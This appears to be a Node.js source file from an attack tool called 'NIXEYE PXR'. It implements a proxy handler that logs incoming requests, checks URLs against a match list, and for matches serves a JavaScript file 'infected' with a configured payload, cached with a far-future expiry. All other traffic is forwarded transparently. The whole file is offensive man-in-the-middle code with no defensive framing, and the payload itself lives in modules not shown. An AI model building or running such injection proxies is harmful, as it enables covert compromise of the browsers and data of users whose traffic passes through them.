/*
 * 
 * NIXEYE PXR ROUTING SCHEME
 * ================= (alpha)
 * 
 */


var	reqCore = require(__dirname + '/../core/req.core.js').ReqCore,
	duiCore = require(__dirname + '/../core/dui.core.js').DuiCore,
	http = require('http'),
	path = require('path'),
	url = require('url'),
	fs = require('graceful-fs'),
	syspaths = require(__dirname + '/../core/cnf.core.js').syspaths,
	cnf = require(__dirname + '/../core/cnf.core.js').settings;



/* Loading loggers */
var errorlog = require(__dirname + '/../core/logs.core.js').ErrorLog,
	eventlog = require(__dirname + '/../core/logs.core.js').EventLog;



exports.pxrHandler = function(request, response){
	
	// validating gathered request data
	if(
		(typeof(request) === 'undefined') || (request === null) ||
		(typeof(request.url) === 'undefined') || (request.url === null) ||
		(typeof(request.connection.remoteAddress) === 'undefined') || 
		(request.connection.remoteAddress === 'null')
	
	){response.send(402, 'boom...');}
	else{
		
		// declaring some needed holders
		var rawurl = url.parse(request.url),
			coredui = new DuiCore(),
			corereq = new ReqCore(),
			reqport = cnf.port1;
		
		// parsing request & add data to DB
		corereq.parseRequest(request, function(err, state){});
		
		// matching request for injection
		coredui.matchUrl(request.url, function(err, urlmatch){
			
			// fail safe bail out
			if(err){errorlog.error(err);}
			if(urlmatch){
				
				// gathering and injecting file
				coredui.urlInjection(
				
					request.url, 
					request.connection.remoteAddress.replace('::ffff:', ''), 
					cnf.payload, 
				
				function(err, injres){
					
					// infected file path build up & stat it!
					var filePath = path.join(syspaths.tmp + injres),
						stat = fs.statSync(filePath);

					// building up response headers
					response.writeHead(200, 
					{
						'Content-Type': 'application/javascript',
						'Content-Length': stat.size,
						'Expires': 'Wed, 31 Dec 2025 23:59:00 GMT'
					});
					
					// gather data from file and send response
					var readStream = fs.createReadStream(filePath);
					readStream.pipe(response);
				});
			}
			else{
				
				// creating requester & listener instances
				var hostdata = request.headers['host'].split(':'),
					proxy = http.createClient(reqport, hostdata[0]),
					proxy_request = proxy.request(request.method, request.url, request.headers); // src->srv 
					
				// declaring listeners...
				proxy_request.addListener('response', function (proxy_response){
					
					// trigger on response data receive
					proxy_response.addListener('data', function (chunk) {
						response.write(chunk, 'binary');
					});
					
					// trigger on response end
					proxy_response.addListener('end', function() {
						response.end();
					});
					
					// building up response headers
					response.writeHead(proxy_response.statusCode, proxy_response.headers); // srv->src headers
				});
				
				// trigger on request data receive
				request.addListener('data', function(chunk) {
					proxy_request.write(chunk, 'binary');
				});
				
				// trigger on request end
				request.addListener('end', function() {
					proxy_request.end();
				});	
			}
		});
	}
};
